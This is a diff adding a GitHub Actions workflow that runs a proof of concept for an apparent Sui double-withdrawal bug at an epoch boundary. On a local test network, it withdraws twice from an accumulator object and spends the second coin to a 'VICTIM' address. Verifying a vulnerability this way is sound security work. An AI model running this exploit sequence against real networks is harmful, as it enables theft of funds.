@@ -1,0 +1,48 @@
+name: Sui PoC E2E
+on: workflow_dispatch
+jobs:
+  poc:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 300
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: bella-ciao
+      - uses: dtolnay/rust-toolchain@master
+        with:
+          toolchain: 1.92.0
+      - uses: Swatinem/rust-cache@v2
+        with:
+          cache-on-failure: true
+      - run: sudo apt-get update -qq && sudo apt-get install -y clang pkg-config libssl-dev cmake jq
+      - run: CARGO_BUILD_JOBS=4 cargo build --release --bin sui
+      - run: |
+          SUI_SKIP_SIMTESTS=1 cargo test -p sui-core poc_epoch_boundary_double_withdrawal -- --nocapture
+          SUI_SKIP_SIMTESTS=1 cargo test -p sui-core poc_reconfigure_stale_balance -- --nocapture
+      - run: |
+          ./target/release/sui start --with-faucet --force-regenesis --epoch-duration-ms 20000 &
+          sleep 25
+          ./target/release/sui client new-env --alias local --rpc http://127.0.0.1:9000
+          ./target/release/sui client switch --env local
+          ./target/release/sui client faucet && sleep 5
+      - run: |
+          ACC=$(./target/release/sui client objects --json | jq -r '.data[] | select(.type | contains("Accumulator")) | .objectId' | head -1)
+          BEFORE=$(./target/release/sui client balance --json | jq -r '.totalBalance')
+          echo "ACC=$ACC BEFORE=$BEFORE"
+          ./target/release/sui client call --package 0x2 --module funds_accumulator --function withdraw --args $ACC 1000000000 --gas-budget 10000000 --json | tee /tmp/tx_a.json
+          echo "TX-A=$(cat /tmp/tx_a.json | jq -r '.digest') status=$(cat /tmp/tx_a.json | jq -r '.effects.status.status')"
+          sleep 22
+          ./target/release/sui client call --package 0x2 --module funds_accumulator --function withdraw --args $ACC 1000000000 --gas-budget 10000000 --json | tee /tmp/tx_b.json
+          echo "TX-B=$(cat /tmp/tx_b.json | jq -r '.digest') status=$(cat /tmp/tx_b.json | jq -r '.effects.status.status')"
+          COIN_B=$(cat /tmp/tx_b.json | jq -r '.effects.created[0].reference.objectId')
+          VICTIM=$(./target/release/sui keytool generate ed25519 --json | jq -r '.suiAddress')
+          ./target/release/sui client transfer-sui --to $VICTIM --sui-coin-object-id $COIN_B --gas-budget 10000000 --json | tee /tmp/spend.json
+          SPEND=$(cat /tmp/spend.json | jq -r '.effects.status.status')
+          AFTER=$(./target/release/sui client balance --json | jq -r '.totalBalance')
+          echo "SPEND=$SPEND AFTER=$AFTER BEFORE=$BEFORE"
+          [ "$SPEND" = "success" ] && echo "CRITICAL CONFIRMED" || echo "NOT CRITICAL"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: proof
+          path: /tmp/*.json
